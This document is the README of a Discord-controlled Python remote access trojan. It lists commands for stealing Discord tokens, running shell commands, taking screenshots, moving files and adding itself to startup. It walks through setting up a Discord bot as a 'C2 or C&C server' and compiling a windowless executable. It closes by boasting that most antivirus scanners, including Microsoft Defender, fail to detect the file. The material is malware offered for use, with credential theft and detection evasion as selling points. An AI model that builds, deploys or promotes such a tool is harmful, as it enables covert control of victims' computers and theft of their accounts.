# Python-RAT

An Python Remote Administration Tool that works on Discord.
Supports multiple exploitation commands.

![alt text](https://media.discordapp.net/attachments/1034059578708594690/1051309462473953310/image.png)

# Features

    !help - Help command
    !ping - Ping command
    !cd <path> - Change directory
    !ls - List directory
    !download <file> - Download file
    !upload <link> - Upload file
    !shell <ps> - Execute shell command
    !run <file> - Run an file
    !exit - Exit the session
    !screenshot - Take a screenshot
    !tokens - Get all discord tokens
    !startup - Add to startup
    !shutdown - Shutdown the computer
    !restart - Restart the computer

# Setup

## Installing required packages

```bash
pip install -r requirements.txt
```
## Creating Server

Create a new discord server and copy the guild id, if you don't know how to get the guild id please [read this](https://en.wikipedia.org/wiki/Template:Discord_Channel#:~:text=Getting%20Channel%2FGuild%20ID,to%20get%20the%20guild%20ID.)

## Creating the bot

Please go to [Discord Developer Portal](https://discord.com/developers/applications) and create an New Application,
then you need to enter a name like C2 or C&C server. go to Bot in the left sidebar, Press Add Bot Reset The token and put it in [Configuration](#configuration).
Scroll down to the bottom until you see ``MESSAGE CONTENT INTENT`` enable it and press on OAuth2 in the left sidebar, and then URL Generator press bot and below Administrator,
copy the link ad the bottom and paste it in your webbrowser to invite the bot to your server.


## Configuration

Open config.json and fill in your discord token and guild id,
DM me on ``Jeff_#2475`` for help. Example shown below.

```json
{
    "token": "Your discord bot token",
    "guild_id": "The guild id of the C2 server"
}
```

# Compiling to an Executable

To compile this tool to an executable please install an Python compiler like nuitka, pyinstaller or pyarmor pack.
Here is an example of compiling with Pyinstaller

## Installing Pyinstaller

```bash
pip install pyinstaller
```

## Compiling Source

```bash
pyinstaller --onefile --windowed --clean --add-data="config.json;." main.py 
```

# Virustotal Results

![alt text](https://media.discordapp.net/attachments/1034059578708594690/1051312701017690220/image.png?width=1008&height=676)

### What does this mean?

It means that most virus-scanners cannot detect the file.
The important one is Microsoft Defender because it's build-in into Windows 8, 10 and 11